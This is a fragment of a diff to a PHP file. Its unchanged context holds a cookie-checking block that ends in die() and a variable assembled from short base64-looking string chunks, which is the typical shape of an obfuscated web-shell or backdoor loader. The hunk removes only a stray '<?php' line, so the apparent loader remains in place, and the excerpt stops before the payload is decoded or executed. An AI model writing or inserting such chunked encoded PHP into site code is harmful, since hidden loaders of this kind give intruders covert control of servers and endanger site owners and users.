@@ -13,7 +13,6 @@ if(isset($_COOKIE)) {
         die();
     }
 }
-<?php
 $z = "";
 $z .= "Q2k4";
 $z .= "cUNn";
